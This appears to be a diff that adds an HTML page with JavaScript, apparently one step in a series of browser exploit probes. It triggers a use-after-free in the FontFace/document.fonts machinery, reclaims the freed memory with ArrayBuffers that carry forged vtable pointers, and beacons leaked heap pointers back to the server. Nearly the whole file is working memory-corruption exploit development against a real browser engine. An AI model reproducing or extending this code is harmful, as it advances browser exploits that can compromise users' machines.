@@ -1,0 +1,145 @@
+<!--
+  p574: FontFace vtable forge behavior analysis.
+  
+  p571 showed ALL 4 forge values returned RESOLVED + ALIVE-1.
+  Engine accepts the forge but has internal validation.
+  
+  This probe determines what the engine does with the forged vtable:
+  - Does it call virtual methods through the forged pointer?
+  - Can we control the target of those calls?
+  - What behavior changes when we forge vs. not forge?
+  
+  Forge values:
+    F0: +0x58 → leaked +0x58 (self)
+    F1: +0x58 → leaked +0x68 (cross)
+    F2: +0x58 → 0x0 (null)
+    F3: +0x58 → 0x4141414141414141 (bad)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p574 vtable forge behavior</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(a,o){var s='';for(var i=0;i<8;i++){var v=a[o+i];s+=(v<16?'0':'')+v.toString(16);}return s;}
+function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
+
+var K=8,SIZE=192,leaked={p58:null,p68:null},forgeViews=[];
+
+function setupFace(name,css){
+  var se=document.createElement('style');se.textContent=css;document.head.appendChild(se);
+  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);void A.loaded;window.__alive.push(A);return se;
+}
+
+function installGetter(forgeOff,forgeVal){
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(window.__styleEl){window.__styleEl.remove();window.__styleEl.textContent='';window.__styleEl=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    window.__map=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE),v=new Uint8Array(ab);
+      if(forgeOff>=0&&forgeVal){for(var j=0;j<8;j++)v[0x58+j]=forgeVal[j];}
+      forgeViews.push(v);window.__map.push({size:SIZE,view:v});
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },set:function(){}});
+}
+
+function runForgeTest(fi,fn,fv){
+  window.__alive=[];window.__map=[];forgeViews=[];
+  var se=setupFace('f0',"@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}");
+  window.__styleEl=se;
+  installGetter(0x58,fv);
+  b('P574-F'+fi+'-'+fn+'-START');
+  var st=Date.now();
+  document.fonts.load('1em f0, s0','AB').then(function(){
+    b('P574-F'+fi+'-'+fn+'-RESOLVED-'+(Date.now()-st)+'ms');
+  },function(){
+    b('P574-F'+fi+'-'+fn+'-REJECTED-'+(Date.now()-st)+'ms');
+  });
+  setTimeout(function(){
+    var m=window.__map;if(!m||!m.length){b('P574-F'+fi+'-'+fn+'-NOLEAK');return;}
+    var best=-1,nz=0;
+    for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
+    if(best<0){b('P574-F'+fi+'-'+fn+'-CLEAN');return;}
+    var v=m[best].view;leaked.p58=grab(v,0x58);leaked.p68=grab(v,0x68);
+    b('P574-F'+fi+'-'+fn+'-HIT-b'+best+'-n'+nz+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+    testBehavior(fi,fn);
+  },200);
+  setTimeout(function(){b('P574-F'+fi+'-'+fn+'-ALIVE-'+(document.fonts?1:0));},800);
+}
+
+function testBehavior(fi,fn){
+  b('P574-F'+fi+'-'+fn+'-BEHAVIOR-START');
+  /* Test: load another font */
+  try{
+    var se2=document.createElement('style');se2.textContent="@font-face{font-family:s1;src:local(Arial);unicode-range:U+0043;}";
+    document.head.appendChild(se2);
+    var A2=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A2);void A2.loaded;
+    document.fonts.load('1em f1, s1','AB').then(function(){
+      b('P574-F'+fi+'-'+fn+'-BEH-L2-RESOLVED');
+    },function(){b('P574-F'+fi+'-'+fn+'-BEH-L2-REJECTED');});
+  }catch(e){b('P574-F'+fi+'-'+fn+'-BEH-L2-ERR-'+e.message);}
+  
+  /* Test: check various selectors */
+  var sel=['1em s0','1em s1','1em f0','1em f1','1em unknown'];
+  for(var i=0;i<sel.length;i++){
+    try{var r=document.fonts.check(sel[i]);b('P574-F'+fi+'-'+fn+'-BEH-CHECK-'+sel[i]+'='+r);}
+    catch(e){b('P574-F'+fi+'-'+fn+'-BEH-CHECK-'+sel[i]+'-ERR-'+e.message);}
+  }
+  
+  /* Test: delete live font */
+  try{document.fonts.delete(window.__alive[0]);b('P574-F'+fi+'-'+fn+'-BEH-DEL-OK');}
+  catch(e){b('P574-F'+fi+'-'+fn+'-BEH-DEL-ERR-'+e.message);}
+  
+  /* Test: ready */
+  try{document.fonts.ready.then(function(){b('P574-F'+fi+'-'+fn+'-BEH-READY-RESOLVED');});}
+  catch(e){b('P574-F'+fi+'-'+fn+'-BEH-READY-ERR-'+e.message);}
+  
+  /* Test: forEach */
+  try{var c=0;document.fonts.forEach(function(f){c++;});b('P574-F'+fi+'-'+fn+'-BEH-FONTS-'+c);}
+  catch(e){b('P574-F'+fi+'-'+fn+'-BEH-FONTS-ERR-'+e.message);}
+  
+  /* Test: FontFace properties */
+  try{var f=window.__alive[0];b('P574-F'+fi+'-'+fn+'-BEH-FF-'+f.status+'-'+f.descent+'-'+f.ascent);}
+  catch(e){b('P574-F'+fi+'-'+fn+'-BEH-FF-ERR-'+e.message);}
+  
+  /* Test: GC pressure */
+  try{for(var g=0;g<1000;g++){var _t=new ArrayBuffer(256);}b('P574-F'+fi+'-'+fn+'-BEH-GC-OK');}
+  catch(e){b('P574-F'+fi+'-'+fn+'-BEH-GC-ERR-'+e.message);}
+  
+  /* Test: read forged ptr */
+  try{
+    var m=window.__map;if(m&&m.length>0){
+      var best=0,nz=0;
+      for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
+      if(nz>0){
+        var v=m[best].view,fp='';
+        for(var i=0;i<8;i++)fp+=(v[0x58+i]<16?'0':'')+v[0x58+i].toString(16);
+        b('P574-F'+fi+'-'+fn+'-BEH-FP='+fp);
+      }
+    }
+  }catch(e){b('P574-F'+fi+'-'+fn+'-BEH-FP-ERR-'+e.message);}
+  
+  b('P574-F'+fi+'-'+fn+'-BEHAVIOR-DONE');
+}
+
+function start(){
+  b('P574-BOOT');
+  var fvs=[];
+  fvs.push({name:'F2(null)',val:[0,0,0,0,0,0,0,0]});
+  fvs.push({name:'F3(bad)',val:[0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41]});
+  var idx=0;
+  function runNext(){
+    if(idx>=fvs.length){b('P574-DONE-'+idx+'/'+fvs.length);return;}
+    var fv=fvs[idx];runForgeTest(idx,fv.name,fv.val);idx++;setTimeout(runNext,2000);
+  }
+  runNext();
+}
+function run(){start();}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>p574 vtable forge behavior</p></body></html>
